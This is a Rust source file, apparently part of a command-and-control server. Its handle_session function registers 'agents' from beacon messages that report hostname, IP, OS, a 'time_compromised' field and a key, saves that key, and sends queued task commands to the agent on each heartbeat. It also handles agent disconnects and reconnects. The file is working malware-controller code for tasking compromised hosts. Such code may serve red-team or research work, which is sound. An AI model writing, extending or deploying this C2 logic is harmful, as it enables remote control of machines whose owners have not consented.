use tokio::net::TcpStream;
use tokio_util::codec::{FramedRead, FramedWrite};
use futures::{SinkExt, StreamExt};
use std::sync::Arc;
use tokio::sync::Mutex;
use std::net::SocketAddr;
use uuid::Uuid;

use crate::server::communication::codec::JsonCodec;
use crate::server::communication::message::{AgentMessage, ServerMessage}; 
use crate::core::c2::C2; 
use crate::utils::logging::Logging;



pub async fn handle_session(stream: TcpStream, addr: SocketAddr, c2: Arc<Mutex<C2>>) {
    // Wrap the TCP stream with the codec to get a framed stream
    let (read_half, write_half) = stream.into_split();
    let mut framed_rx = FramedRead::new(read_half, JsonCodec::<AgentMessage>::new());
    let mut framed_tx = FramedWrite::new(write_half, JsonCodec::<ServerMessage>::new());

    // === Step 1: Handshake ===
    let Some(Ok(msg)) = framed_rx.next().await else {
        let msg = format!("[-] Handshake failed or connection closed early from {}", addr);
        Logging::ERROR.print_message(&msg);
        return;
    };

    match msg {
        AgentMessage::Beacon {
            hostname, ip, os, time_compromised, key
        } => {
            // Create/register the agent in the C2
            let mut c2 = c2.lock().await;
            let session = Uuid::new_v4().to_string();
            let agent_id = c2.create_agent(&ip, &hostname, &os, &time_compromised, &session).await;
            // Respond to the agent with an Ack (includes its agent ID and session info)
            let ack = ServerMessage::Ack {
                agent_id,
                status: "Registered".to_string(),
                session_id: session
            };

            // Handle key storage
            let _ = crate::utils::utils::save_key(agent_id, &key);

            let _ = framed_tx.send(ack).await;
        }
        AgentMessage::Heartbeat {
            agent_id, session_id, result
        }=> {
            // Update agent's last_seen timestamp
            let c2 = c2.lock().await;
            if c2.check_session(&session_id).await {
                c2.update_agent_time(agent_id).await;

                // Handle results: TODO
                match result {
                    Some(res) => {
                        c2.update_result(agent_id, res).await;
                        Logging::SUCCESS.print_message(&format!("[+] Received data from Agent {}", agent_id));
                    }
                    None => {}
                }

                // Check TaskManager for any tasks for agent_id
                match c2.get_tasks(agent_id).await {
                    Some(tasks) => {
                        let num = &tasks.len();
                        // Send Task to Agent
                        let task = ServerMessage::Task {
                            agent_id,
                            session_id,
                            command: tasks
                        };

                        let _ = framed_tx.send(task).await;

                        Logging::INFO.print_message(
                            &format!("[+] Received Heartbeat from Agent {} and sent {} tasks", agent_id, num));
                    }
                    None => {
                        let noop = ServerMessage::Noop { agent_id, session_id };
                        let _ = framed_tx.send(noop).await;
                        Logging::INFO.print_message(
                            &format!("[+] Received Heartbeat from Agent {}", agent_id));
                    }
                }
            }
        }
        AgentMessage::Disconnect {
            agent_id, session_id
        } => {
            // Remove agent from C2
            let mut c2 = c2.lock().await;
            if c2.check_session(&session_id).await {
                c2.remove_agent(agent_id).await;
            }
        }
        AgentMessage::Reconnect { 
            agent_id, session_id 
        } => {
            // agent_id should stay the same, but session id should change
            // changes should reflect in both agent and c2
            let c2 = c2.lock().await;
            if c2.check_session(&session_id).await {
                c2.update_agent_time(agent_id).await;

                let session = Uuid::new_v4().to_string();
                c2.update_agent_session(agent_id, &session).await;

                // Respond to the agent with an Ack
                let ack = ServerMessage::Ack {
                    agent_id,
                    status: "Reconnected".to_string(),
                    session_id: session
                };

                let _ = framed_tx.send(ack).await;
            }

            
        }
    }
}


